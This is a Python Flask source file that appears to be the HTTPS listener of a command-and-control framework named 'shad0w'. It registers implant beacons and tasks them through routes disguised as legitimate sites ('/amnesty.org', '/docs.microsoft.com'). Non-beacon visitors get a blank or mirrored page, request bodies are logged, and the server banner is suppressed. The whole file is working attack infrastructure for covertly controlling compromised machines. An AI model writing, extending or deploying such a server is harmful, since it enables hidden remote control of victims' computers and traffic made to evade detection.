import sys
import logging
import mimetypes

import logging.handlers
from path_handler import Handler

from OpenSSL import SSL
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# shut flask output up
log                    = logging.getLogger('werkzeug')
handler = logging.handlers.RotatingFileHandler('log.txt', mode='a')
log.addHandler(handler)
log.setLevel(logging.DEBUG)
#log.disabled           = True
cli                    = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

IGNORE_CONTENT = ""

@app.before_request
def log_request():
    # this will show every request that the flask server gets

    # shad0w.debug.log(request)
    log.debug('\nBody: %s',request.get_data())
    # do nothin jus return
    return None

@app.route("/")
def web_blank_page():
    # this page should never be hit by a legit beacon, so if it is then its not a beacon.
    # either return a blank page or a mirrored page depending on what the user has set.
    print("HTTP - '/' was hit")

    return phandle.blank_page()

@app.route("/amnesty.org", methods=["GET", "POST"])
def web_register_beacon():
    # register the beacon

    print("HTTP - '/register' was hit, attempting to register")

    # just give it the request so it can pull stuff out itsself
    return phandle.register_beacon(request)

@app.route("/docs.microsoft.com", methods=["GET", "POST"])
def web_task_beacon():
    # register a task on a beacon

    return phandle.task_beacon(request)

def run_serv(*args):
    # cant think of a better way doing this so guess i gotta use globals
    global shad0w, phandle
    shad0w  = args[0]

    phandle = Handler(shad0w)

    print("starting flask http server")
    print(f"Starting HTTPS server ({shad0w.addr[0]}:{shad0w.addr[1]})")
    print(f"creating ssl context with {shad0w.sslkey} & {shad0w.sslcrt}")

    try:
        app.run(host=shad0w.addr[0], port=shad0w.addr[1], ssl_context=(shad0w.sslcrt, shad0w.sslkey))
    except FileNotFoundError:
        shad0w.debug.error(f"Unable to find cert: {shad0w.sslcrt} or private key: {shad0w.sslkey}. You should exit.")
        return
